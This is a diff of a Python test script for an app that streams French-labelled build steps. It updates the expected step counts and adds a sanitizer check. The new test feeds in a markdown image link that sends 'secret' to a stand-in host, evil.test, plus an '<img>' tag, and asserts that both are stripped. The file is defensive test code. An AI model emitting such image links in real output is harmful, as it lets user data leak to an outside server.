@@ -37,12 +37,15 @@ page = {"title": "T", "text": "hello"}
 updates = run(page)
 assert "en cours" in updates[0][0] and len(updates) > 5, "steps must be streamed"
 final_html, message = updates[-1]
-assert final_html.count("(terminé)") == 7 and final_html.count("(échec)") == 1, final_html
+assert final_html.count("(terminé)") == 8 and final_html.count("(échec)") == 1, final_html
 assert "&lt;boom&gt;" in final_html and "<boom>" not in final_html, "error text must be escaped"
 assert "recursive" in message and app.state["knowledge_base"] is not None
 
-assert run(page, build_all=False)[-1][0].count("(à la première utilisation)") == 4
+assert run(page, build_all=False)[-1][0].count("(à la première utilisation)") == 5
 
 failed_html = run({})[-1][0]
-assert failed_html.count("(échec)") == 1 and failed_html.count("(en attente)") == 7, failed_html
+assert failed_html.count("(échec)") == 1 and failed_html.count("(en attente)") == 8, failed_html
+
+leak = app.plain_text("![x](http://evil.test/?q=secret) <img src=x>")
+assert "![" not in leak and "<img" not in leak, leak
 print("app ok")
